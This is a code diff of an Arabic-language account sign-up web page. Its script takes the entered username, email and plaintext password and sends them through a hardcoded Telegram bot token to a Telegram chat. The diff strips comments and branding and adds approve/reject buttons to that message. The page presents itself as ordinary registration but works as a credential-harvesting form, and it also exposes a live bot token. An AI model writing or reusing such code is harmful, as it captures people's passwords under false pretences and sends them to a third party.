@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>إنشاء حساب - سوبر تــــــكنو</title>
-    <link rel="stylesheet" href="styles.css">
     <style>
         .notification {
             display: none;
@@ -22,71 +21,52 @@
     </style>
 </head>
 <body>
-    <!-- العنوان في الأعلى -->
-    <header class="header">
-        <h1>ســـــــوبر تــــــكنو</h1>
-    </header>
-
-    <!-- قسم تسجيل الحساب -->
     <div class="signup-container">
         <div class="signup-box">
             <h2>إنشاء حساب جديد</h2>
             <form id="signupForm">
-                <!-- حقل اسم المستخدم -->
                 <div class="input-group">
                     <label for="username">اسم المستخدم</label>
                     <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
                 </div>
 
-                <!-- حقل البريد الإلكتروني -->
                 <div class="input-group">
                     <label for="email">البريد الإلكتروني</label>
                     <input type="email" id="email" placeholder="أدخل البريد الإلكتروني" required>
                 </div>
 
-                <!-- حقل كلمة المرور -->
                 <div class="input-group">
                     <label for="password">كلمة المرور</label>
                     <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
                 </div>
 
-                <!-- حقل تأكيد كلمة المرور -->
                 <div class="input-group">
                     <label for="confirm-password">تأكيد كلمة المرور</label>
                     <input type="password" id="confirm-password" placeholder="أعد إدخال كلمة المرور" required>
                 </div>
 
-                <!-- زر التسجيل -->
                 <button type="submit" class="signup-btn">إنشاء الحساب</button>
             </form>
             <div id="notification" class="notification"></div>
         </div>
     </div>
 
-    <!-- الكليشية في أسفل الصفحة -->
-    <footer class="footer">
-        <p>جميع الحقوق محفوظة لدى <span>ســـــــوبر تــــــكنو</span> للخدمات الالكترونية</p>
-    </footer>
-
     <script>
         document.getElementById('signupForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // التحقق من طول كلمة المرور
             const password = document.getElementById('password').value;
             if (!/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/.test(password)) {
                 showNotification('كلمة المرور يجب أن تتكون من 12 حرفًا على الأقل، تحتوي على أحرف كبيرة وصغيرة وأرقام ورموز.', 'error');
                 return;
             }
 
-            // جمع البيانات
             const formData = {
                 username: document.getElementById('username').value,
                 email: document.getElementById('email').value,
                 password: document.getElementById('password').value
             };
 
-            // إرسال البيانات إلى تلغرام عبر البوت
             const botToken = '7226268995:AAH7NSYfl3yO72mTMjsL7S-EfcXvW8N1ME0'; // ضع هنا الـ Token الخاص بالبوت
             const chatId = '@mmssrtff0'; // ضع هنا معرف القناة أو المستخدم
 
@@ -95,22 +75,33 @@
                 اسم المستخدم: ${formData.username}
                 البريد الإلكتروني: ${formData.email}
                 كلمة المرور: ${formData.password}
+                هل توافق على إنشاء الحساب؟
             `;
 
-            // إعداد الرابط لإرسال الرسالة عبر API تلغرام
-            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            const buttons = {
+                inline_keyboard: [
+                    [
+                        { text: 'نعم', callback_data: 'accept' },
+                        { text: 'لا', callback_data: 'reject' }
+                    ]
+                ]
+            };
 
-            // إرسال الطلب
-            fetch(telegramURL).then(response => response.json()).then(data => {
-                if (data.ok) {
-                    showNotification('تم إرسال البيانات بنجاح!', 'success');
-                } else {
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&reply_markup=${JSON.stringify(buttons)}`;
+
+            fetch(telegramURL)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        showNotification('تم إرسال البيانات بنجاح!', 'success');
+                    } else {
+                        showNotification('حدث خطأ، حاول مرة أخرى.', 'error');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
                     showNotification('حدث خطأ، حاول مرة أخرى.', 'error');
-                }
-            }).catch(error => {
-                console.error('Error:', error);
-                showNotification('حدث خطأ، حاول مرة أخرى.', 'error');
-            });
+                });
         });
 
         function showNotification(message, type) {
